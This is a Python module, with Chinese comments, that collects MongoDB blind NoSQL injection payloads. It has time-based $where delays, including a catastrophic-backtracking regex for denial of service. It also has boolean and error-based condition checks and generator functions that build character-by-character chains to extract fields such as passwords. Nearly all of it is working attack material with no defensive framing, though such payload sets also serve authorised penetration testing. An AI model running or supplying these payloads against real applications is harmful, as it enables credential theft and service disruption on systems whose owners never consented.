"""
MongoDB 盲注載荷
包含基於時間、布爾和錯誤的各種盲注技術
"""

import random

# 時間盲注 - 基於查詢執行時間的注入
TIME_BASED_PAYLOADS = [
    {
        "name": "基本時間延遲",
        "value": {"$where": f"sleep({random.randint(2000, 3000)}) || true"},
        "description": "使用sleep函數導致查詢延遲",
        "expected_delay": 2000  # 毫秒
    },
    {
        "name": "條件時間延遲",
        "value": {"$where": f"if(this.username=='admin'){{sleep({random.randint(2000, 3000)})}}; return true"},
        "description": "根據條件執行時間延遲，可用於數據提取",
        "expected_delay": 2000  # 毫秒
    },
    {
        "name": "嵌套循環延遲",
        "value": {"$where": "var x=''; for(var i=0;i<1000;i++){for(var j=0;j<100;j++){x+='a'}}; return true"},
        "description": "使用嵌套循環導致CPU密集操作達到延遲效果",
        "expected_delay": 1000  # 毫秒
    },
    {
        "name": "比較延遲",
        "value": {"$where": f"var d=new Date(); var s=d.getTime(); while((new Date()).getTime()-s<{random.randint(1000, 2000)}){{}}; return true"},
        "description": "使用時間比較實現延遲",
        "expected_delay": 1000  # 毫秒
    },
    {
        "name": "正則表達式DoS", 
        "value": {"$where": "var s = Array(100000).join('a'); s.match(/((a+)+)+$/); return true"},
        "description": "使用易觸發指數回溯的正則表達式導致延遲",
        "expected_delay": 5000  # 毫秒
    }
]

# 自定義時間盲注生成
def generate_time_payload(delay_ms=2000, condition=None):
    """
    生成自定義的時間盲注載荷
    
    Args:
        delay_ms (int): 延遲毫秒數
        condition (str): 條件表達式，如 "this.username=='admin'"
    
    Returns:
        dict: 時間盲注載荷
    """
    if condition:
        return {"$where": f"if({condition}){{sleep({delay_ms})}}; return true"}
    else:
        return {"$where": f"sleep({delay_ms}) || true"}

# 布爾盲注 - 基於查詢結果的注入
BOOLEAN_PAYLOADS = [
    {
        "name": "簡單布爾注入",
        "value": {"$where": "this.username.charAt(0) === 'a'"},
        "description": "檢測用戶名首字母是否為'a'",
        "data_extraction": True
    },
    {
        "name": "字符比較",
        "value": {"$where": "this.password.charCodeAt(0) > 100"},
        "description": "檢測密碼首字節ASCII值是否大於100",
        "data_extraction": True
    },
    {
        "name": "長度比較",
        "value": {"$where": "this.username.length > 5"},
        "description": "檢測用戶名長度是否大於5",
        "data_extraction": True
    },
    {
        "name": "字段存在檢測",
        "value": {"$where": "Object.keys(this).indexOf('admin') >= 0"},
        "description": "檢測文檔是否包含admin字段",
        "data_extraction": True
    },
    {
        "name": "數組包含檢測",
        "value": {"$where": "Array.isArray(this.roles) && this.roles.indexOf('admin') >= 0"},
        "description": "檢測角色數組是否包含admin",
        "data_extraction": True
    }
]

# 自定義布爾盲注生成
def generate_boolean_payload(field, position, character=None, operation=None):
    """
    生成自定義的布爾盲注載荷用於數據提取
    
    Args:
        field (str): 要提取的字段名
        position (int): 字符位置
        character (str, optional): 要比較的字符
        operation (str, optional): 比較操作符，如'==', '>', '<'
    
    Returns:
        dict: 布爾盲注載荷
    """
    if character and operation:
        return {"$where": f"this.{field}.charAt({position}) {operation} '{character}'"}
    elif operation:
        return {"$where": f"this.{field}.charCodeAt({position}) {operation} 0"}
    else:
        return {"$where": f"this.{field}.length > {position}"}

# 錯誤盲注 - 基於錯誤的注入
ERROR_BASED_PAYLOADS = [
    {
        "name": "空指針錯誤",
        "value": {"$where": "if(this.username=='admin'){return x.a}else{return true}"},
        "description": "根據條件觸發空指針異常",
        "data_extraction": True
    },
    {
        "name": "類型錯誤",
        "value": {"$where": "if(this.username=='admin'){return true+[]}else{return true}"},
        "description": "根據條件觸發類型錯誤",
        "data_extraction": True
    },
    {
        "name": "語法錯誤",
        "value": {"$where": "if(this.username=='admin'){return eval('x:')}else{return true}"},
        "description": "根據條件觸發語法錯誤",
        "data_extraction": True
    },
    {
        "name": "數組越界",
        "value": {"$where": "if(this.username=='admin'){return this.username[1000].length}else{return true}"},
        "description": "根據條件觸發數組越界錯誤",
        "data_extraction": True
    }
]

# 完整的數據提取盲注套件
def get_data_extraction_payloads(target_field="password"):
    """
    獲取用於數據提取的完整盲注套件
    
    Args:
        target_field (str): 目標字段，如'password'或'email'
    
    Returns:
        dict: 數據提取payload集合
    """
    extraction_payloads = {
        "length_check": [
            {"$where": f"this.{target_field}.length > {i}"} for i in range(5, 20)
        ],
        "character_checks": [
            {
                "position": i,
                "values": [
                    {"$where": f"this.{target_field}.charAt({i}) == '{c}'"} 
                    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
                ]
            } for i in range(10)  # 檢查前10個字符位置
        ],
        "time_based": [
            {"$where": f"if(this.{target_field}.charAt({i})=='a'){{sleep(2000)}}; return true"} 
            for i in range(10)  # 檢查前10個字符位置
        ]
    }
    return extraction_payloads

# 經典的字段提取盲注鏈（返回一個數組，可依次執行）
def get_blind_extraction_chain(field_name="password", known_prefix=""):
    """
    獲取經典的字段提取盲注鏈
    
    Args:
        field_name (str): 要提取的字段名
        known_prefix (str): 已知的字段值前綴
    
    Returns:
        list: 盲注鏈，可依次執行
    """
    position = len(known_prefix)
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"
    
    return [
        {
            "type": "length",
            "payload": {"$where": f"this.{field_name}.length > {position}"},
            "description": f"檢查{field_name}長度是否大於{position}"
        }
    ] + [
        {
            "type": "character",
            "position": position,
            "char": c,
            "payload": {"$where": f"this.{field_name}.charAt({position}) == '{c}'"},
            "description": f"檢查{field_name}在位置{position}的字符是否為'{c}'"
        } for c in charset
    ] 